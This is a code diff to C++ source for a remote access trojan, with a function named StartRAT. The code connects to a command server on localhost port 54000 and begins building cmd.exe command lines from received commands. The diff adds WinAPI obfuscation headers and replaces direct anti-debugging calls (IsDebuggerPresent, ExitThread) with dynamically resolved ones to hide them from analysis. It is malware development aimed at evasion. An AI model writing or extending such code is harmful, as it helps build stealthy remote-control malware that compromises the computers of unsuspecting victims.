@@ -2,18 +2,18 @@
 #include <string>
 #include "TCPClient.h"
 #include "utils.h"
-
+#include "winapi_function_signatures.h"
+#include "winapi_obfuscation.h"
 
 DWORD WINAPI StartRAT(LPVOID lpParam)
 {
 	TCPClient* conn = new TCPClient("127.0.0.1", 54000);
 	conn->start_connection();
-	
 
 	while (true)
 	{
-		if (IsDebuggerPresent() || isDebuggerAttached())
-			ExitThread(0);
+		if (resolve_dynamically<IsDebuggerPresent_t>("IsDebuggerPresent")() || isDebuggerAttached())
+			resolve_dynamically<ExitThread_t>("ExitThread")(0);
 
 		// recv command from server
 		std::string commandLine = "cmd.exe /C ";
